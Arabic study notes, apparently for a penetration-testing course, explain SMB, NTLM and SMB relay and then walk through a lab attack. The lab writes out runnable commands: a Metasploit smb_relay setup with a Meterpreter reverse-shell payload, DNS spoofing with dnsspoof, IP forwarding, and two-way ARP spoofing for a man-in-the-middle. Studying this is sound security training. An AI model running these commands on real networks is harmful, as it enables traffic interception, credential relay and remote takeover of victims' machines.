
# SMB
## Server Message Block

بروتوكول تستخدمه ويندوز لـ:

- مشاركة الملفات
- الطابعات
- الشيرز
- Remote administration
- IPC

---

# مثال

لما تفتح:

```
\\SERVER\Documents
```

أنت تستخدم SMB.


# ماذا يحدث عند الاتصال؟

الجهاز يقول:

> “أثبت هويتك.”


# هنا يأتي NTLM Authentication

ويندوز غالباً يستخدم:

## NTLM

لإثبات الهوية.


# كيف يعمل NTLM بشكل مبسط؟


# 1) Client يطلب الدخول

مثلاً:

```
أنا المستخدم أحمد
```


# 2) Server يرسل Challenge

رقم عشوائي.


# 3) Client يستخدم Password Hash

لإنشاء Response.


# 4) Server يتحقق

إذا صحيح:  
✅ دخول.

---

# المهم جداً 

## الباسورد لا يُرسل مباشرة.


# إذاً أين المشكلة؟

المشكلة:  
أن الـ authentication نفسها  
يمكن:

## إعادة استخدامها مؤقتاً.


# هنا ظهر مفهوم SMB Relay


# ما معنى Relay؟

Relay =

## إعادة تمرير


# الفكرة الأساسية

بدل أن أكسر الـ NTLM،  
أقوم فقط:

> بإعادة تمريره لسيرفر آخر.


# مثال 


# الضحية تقول للمهاجم:

```
أنا أحمد وهذا إثباتي
```


# المهاجم لا يفهم الإثبات،

لكن يقول:

```
سأرسله كما هو للسيرفر الحقيقي 
```


# السيرفر الحقيقي يقول:

```
أوه هذا أحمد فعلاً
```

ويسمح بالدخول.


# لماذا يحدث هذا؟

لأن بعض السيرفرات:  
لا تتحقق جيداً من:

- مصدر الـ authentication
- أو Integrity

خصوصاً إذا:

## SMB Signing Disabled


# ما هو SMB Signing؟

ميزة أمان.

تجعل SMB messages:

- موقعة رقمياً
- وغير قابلة للتعديل أو relay بسهولة


# إذا كان Disabled؟

السيرفر يثق بأي authentication صحيح،  
حتى لو جاء عبر مهاجم.


# إذاً SMB Relay يعتمد على ماذا؟


# 1) اعتراض الاتصال

MITM.


# 2) الضحية تعمل NTLM Authentication


# 3) المهاجم يعيد تمرير الـ auth


# 4) السيرفر يقبل

---
# Lab

# 1) تشغيل SMB Relay في Metasploit

```
msfconsoleuse exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit
```

|         |                                               |
| ------- | --------------------------------------------- |
| SRVHOST | IP جهاز المهاجم الذي سيستقبل SMB (سيرفر وهمي) |

|   |   |
|---|---|
|LHOST|مكان رجوع الـ reverse shell|

|   |   |
|---|---|
|SMBHOST|السيرفر الحقيقي الذي سنعمل له relay|


# 2) إنشاء ملف DNS مزور

```
echo "172.16.5.101 *.sportsfoo.com" > dns
```


# ماذا يفعل؟

أي طلب لـ:

```
anything.sportsfoo.com
```

سيتم تحويله إلى:  
IP المهاجم.


# 3) تشغيل dnsspoof

```
dnsspoof -i eth1 -f dns
```


|الخيار|المعنى|
|---|---|
|-i eth1|كرت الشبكة|
|-f dns|ملف التزوير|

تزوير ردود DNS وإرسال IP المهاجم للضحية.


# 4) تفعيل IP Forwarding

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```


السماح لجهاز المهاجم بتمرير الترافيك بين الضحية والراوتر.

بدونه:  
الاتصال ينقطع.

# 5) تنفيذ ARP Spoofing

## الطرف الأول

```
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1

يعني المهاجم يقول للضحية أنا الراوتر
```
## الطرف الثاني

```
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
المهاجم يقول للراوتر أنا الضحية عشان يمرر الاتصال
```



|IP|من هو|
|---|---|
|172.16.5.5|الضحية|
|172.16.5.1|الراوتر / Gateway|
|172.16.5.101|المهاجم|

إنشاء:

## Man In The Middle


```
Victim <--> Attacker <--> Router
```


![[Pasted image 20260523134213.png]]
# 6) الضحية تبدأ DNS Queries

مثال:

```
A? fileserver.sportsfoo.com
```


# ماذا يحدث؟

dnsspoof يرد:

```
fileserver.sportsfoo.com = 172.16.5.101
```

IP المهاجم.

# 7) الضحية تتصل SMB بالمهاجم

الضحية تعتقد:  
أن المهاجم هو السيرفر الحقيقي.


# 8) SMB Relay يبدأ

Metasploit يلتقط:

- NTLM NEGOTIATE
- NTLM CHALLENGE
- NTLM AUTH

![[Pasted image 20260523134233.png]]

![[Pasted image 20260523134249.png]]


![[Pasted image 20260523134307.png]]